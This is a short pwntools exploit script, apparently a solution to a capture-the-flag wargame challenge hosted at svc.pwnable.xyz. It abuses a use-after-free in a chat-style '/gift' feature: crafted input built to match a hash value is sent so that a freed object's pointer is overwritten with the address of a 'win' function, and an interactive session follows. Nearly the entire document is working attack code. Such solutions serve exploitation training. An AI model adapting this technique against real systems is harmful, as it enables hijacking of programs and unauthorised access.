###UAF

from pwn import *

###Util
def unhash(val):
    val1 = val>>16
    val2 = val&0xffff
    mes = b''
    mes1 = b'\xff'*(val1//0xff)+p8(val1%0xff).strip(b'\x00')
    mes2 = b'\xff'*(val2//0xff)+p8(val2%0xff).strip(b'\x00')
    mes2 = mes2.ljust(len(mes1),b'\x00')
    mes1 = mes1.ljust(len(mes2),b'\x00')
    mes = mes1+mes2
    return mes

def action(command,size=0,data=None,hashed=False):
    r.sendlineafter('@you> ',command)
    if command=='/gift':
        if hashed is True:
            data = unhash(data)
            size = len(data)
        r.sendlineafter('be: ',str(size))
        r.sendafter('gift: ',data)

###Addr
win = 0x400cae

###Exploit
r = remote('svc.pwnable.xyz',30034)
action('/gift',data=0xdeadbeef,hashed=True)
action('/gift',size=0x27,data=b'\x00'*8+p64(win))
action('M30W')

r.interactive()
